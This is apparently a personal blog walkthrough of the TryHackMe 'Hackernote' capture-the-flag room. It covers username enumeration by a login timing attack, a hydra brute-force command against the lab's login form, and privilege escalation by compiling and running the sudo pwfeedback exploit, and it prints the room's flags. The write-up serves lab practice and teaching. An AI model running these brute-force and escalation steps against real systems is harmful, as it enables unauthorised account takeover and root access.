---
title: "Hackernote"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src='hackernote.png' width=200 alt='hackernote'>

A nice room that try to be realistic about web exploitation

## Enumeration

### rustscan + nmap

```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 10:a6:95:34:62:b0:56:2a:38:15:77:58:f4:f3:6c:ac (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0njoI1MTN18O8+mhh7M4EpPVA2+5B3OsOtfyhpjYadmUYmS1LgxRSCAyUNFP3iKM7vmqbC9KalD6hUSWmorDoPCzgTuLPf6784OURkFZeZMmC3Cw3Qmdu348Vf2kvM0EAXJmcZG3Y6fspIsNgye6eZkVNHZ1m4qyvJ+/b6WLD0fqA1yQgKhvLKqIAedsni0Qs8HtJDkAIvySCigaqGJVONPbXc2/z2g5io+Tv3/wC/2YTNzP5DyDYI9wL2k2A9dAeaaG51z6z02l6F1zGzFwiwrFP+fopEjhQUa99f3saIgoq3aPOJ/QufS1SiZc6AqeD8RJ/6HWz10timm5A+n4J
|   256 6f:18:27:a4:e7:21:9d:4e:6d:55:b3:ac:c5:2d:d5:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHKcOFLvSTrwsitMygOlMRDEZIfujX3UEXx9cLfrmkYnn0dHtHsmkcUUMc1YrwaZlDeORnJE5Z/NAH70GaidO2s=
|   256 2d:c3:1b:58:4d:c3:5d:8e:6a:f6:37:9d:ca:ad:20:7c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFFNuuI7oo+OdJaPnUbVa1hN/rtLQalzQ1vkgWKsF9z

80/tcp   open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Home - hackerNote
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

8080/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Home - hackerNote
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Oh wow! A `Go` server! You don't always get those!

For the investigation we made a simple account and started looking around

For the user enumeration the `password reset` can be used but let's focus on the main thing

Introduction to `timing attack`:

As valid passwords seem to take a bit more time (hashing and processing) for a legitimate user, than wrong user's

We just make requests for multiple users (bruteforce)

And compare the times taken for every requests

The longest times (let's say more than 1 second, or any tolerable margin) are probably valid users

Obviously as we are not savages we will automate this with a script!

I chose the `python` exploit, as I am more comfortable with python

(Still Learning Golang)

It took me maaaad long time (for python is so fast) 

pro tips: you can also filter the names.txt list as you know the username lenght

`└──╼ $awk 'length($1) == 5 { print $1 }' names.txt > reduced.txt`

Adapt the time delay correctly 1s should be enough (slow internet, so I had to filter out false-positives to get the right user)

anyway here we go!

```
└──╼ $python3 exploit.py
Making requests ... 
Requests sent!
Time delta:  31.63563323020935  seconds
[REDACTED] is probably valid!
```
I redacted the user, because you have to suffer too

Now for the password attack we need a "custom" wordlist from the hint!

Get the suggested combinator and get a new wordlist

```
└──╼ $./combinator.bin colors.txt numbers.txt > custom_wordlist.txt 
```

Then use that good ol' hydra (or your favorite login forms bruteforcer)

```
└──╼ $hydra -l [username goes here] -P custom_wordlist.txt 10.10.88.143 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).


Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-04 01:08:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
[DATA] attacking http-post-form://10.10.88.143:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
[80][http-post-form] host: 10.10.88.143   login: [username]   password: [REDACTED BOIII]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-04 01:10:12


```

Now we got access! login and grab ssh access too, then get in!

```
user@hackernote:~$ cat user.txt
thm{real_flag_for_free_no_tricks}
```

## Privilege escalation


Remember `pwdfeedback` ? no? google it!

you are even provided the exploit already, so let's just escalate bro


```
└──╼ $gcc pwfeedback.c -o exploit

└──╼ $scp ./exploit user@10.10.88.143:/home/user 
user@10.10.88.143's password: 
exploit 
````
Now witness magic

```
user@hackernote:~$ ./exploit
[sudo] password for user: 
Sorry, try again.
# id
uid=0(root) gid=0(root) groups=0(root),1001(user)

# cat root.txt
thm{true_root_flag_this_time_i_sweaar}

```

## Comments on realism:

>This room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP's authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration

>The privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS

I did that room mostly to see how realist it could go and practice password cracking

was not disappointed but I think this is not always real-life applicable

Anyway, that room was just great! 
